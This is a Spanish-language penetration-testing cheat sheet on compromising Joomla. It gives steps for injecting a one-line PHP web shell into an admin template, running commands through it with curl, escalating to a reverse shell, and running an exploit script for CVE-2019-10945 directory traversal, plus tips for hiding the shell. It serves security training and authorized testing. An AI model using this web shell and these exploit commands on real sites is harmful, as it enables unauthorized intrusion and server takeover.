---
tags:
  - joomla
  - webapp
  - attack
---
## Conceptos Clave (TL;DR)
* Joomla permite la ejecución remota de código (RCE) si se logra acceder al panel de administración (backend).
* Para obtener RCE, se aprovecha la funcionalidad nativa de personalización de plantillas insertando código PHP.
* Aunque existen múltiples vulnerabilidades registradas (CVEs) para Joomla, las vulnerabilidades críticas en el núcleo (core) son raras; la mayoría afecta a extensiones de terceros.
* Versiones específicas, como la 3.9.4, son vulnerables a ataques autenticados como el "Directory Traversal" y eliminación de archivos (CVE-2019-10945).

## Herramientas Clave
* **cURL**: Utilizado para interactuar con la web shell inyectada y confirmar la ejecución de código remoto.
* **joomla_dir_trav.py**: Script de explotación para CVE-2019-10945 que permite listar el contenido del directorio raíz y otros directorios.

## Metodología Paso a Paso

**Fase 1: Acceso al Backend**
* Iniciar sesión en el portal de administración ubicado en `http://<TARGET_DOMAIN>/administrator` utilizando credenciales comprometidas.

**Fase 2: Ejecución de Código Remoto (Abuso de Funcionalidad Nativa)**
* Navegar a la sección de "Templates" ubicada en la parte inferior izquierda bajo el menú de "Configuration".
* Seleccionar el nombre de una plantilla disponible en la columna de plantillas (por ejemplo, `protostar`), lo cual abrirá la página de "Templates: Customise".
* Seleccionar un archivo de la plantilla (por ejemplo, `error.php`) para cargar su código fuente.
* Inyectar una web shell de PHP de una sola línea.
* Hacer clic en "Save & Close" para guardar los cambios.
* Utilizar `curl` apuntando a la ruta del archivo modificado para confirmar la ejecución de comandos y posteriormente escalar a una reverse shell interactiva.

**Fase 3: Explotación de Vulnerabilidades Conocidas (CVE-2019-10945)**
* Si el objetivo ejecuta Joomla 3.9.4, utilizar el script de Python para explotar el "Directory Traversal".
* Esta técnica requiere autenticación mediante banderas de usuario y contraseña.
* Este vector es útil principalmente si el panel de inicio de sesión de administrador no es accesible desde el exterior, ya que de lo contrario el RCE directo vía plantillas es preferible.

## Cheat Sheet de Comandos

### Payload para Web Shell (PHP)
```php
# Payload para inyectar en el código fuente de la plantilla.
# Utiliza un parámetro no estándar (<PARAMETER_NAME>) para evitar el acceso de atacantes oportunistas.
system($_GET['<PARAMETER_NAME>']);
```

### Ejecución de Comandos vía cURL
```bash
# Realiza una petición silenciosa (-s) al archivo PHP modificado pasando un comando (ej. id) al parámetro definido.
curl -s http://<TARGET_DOMAIN>/templates/<TEMPLATE_NAME>/<FILE_NAME>.php?<PARAMETER_NAME>=id
```

### Explotación de CVE-2019-10945 (Directory Traversal)
```bash
# Ejecuta el script de explotación proporcionando la URL del panel de administración, credenciales y el directorio objetivo (/).
python2.7 joomla_dir_trav.py --url "http://<TARGET_DOMAIN>/administrator/" --username <USER> --password <PASSWORD> --dir /
```

## "Gotchas" y Troubleshooting
* **Error de Interfaz Post-Login:** Si tras iniciar sesión aparece el error "An error has occurred. Call to a member function format() on null", se debe navegar manualmente a `http://<TARGET_DOMAIN>/administrator/index.php?option=com_plugins` y deshabilitar el plugin "Quick Icon - PHP Version Check" para que el panel de control se muestre correctamente.
* **Seguridad Operacional (OpSec) para Web Shells:** * Es una buena práctica utilizar nombres de archivo y parámetros no estándar para evitar que atacantes oportunistas descubran la web shell.
  * Se recomienda proteger la web shell con contraseña y limitar el acceso a la dirección IP de origen del atacante.
* **Limpieza:** Se debe hacer todo el esfuerzo posible por eliminar el fragmento de PHP del archivo modificado tan pronto como se termine de usar, y recordar incluir el nombre del archivo, su hash y ubicación en el reporte final.
* **Riesgo de Eliminación de Archivos:** Aunque el exploit CVE-2019-10945 permite la eliminación de archivos, esto no se recomienda, ya que el atacante podría causar daños eliminando archivos necesarios si el usuario del servidor web tiene los permisos adecuados.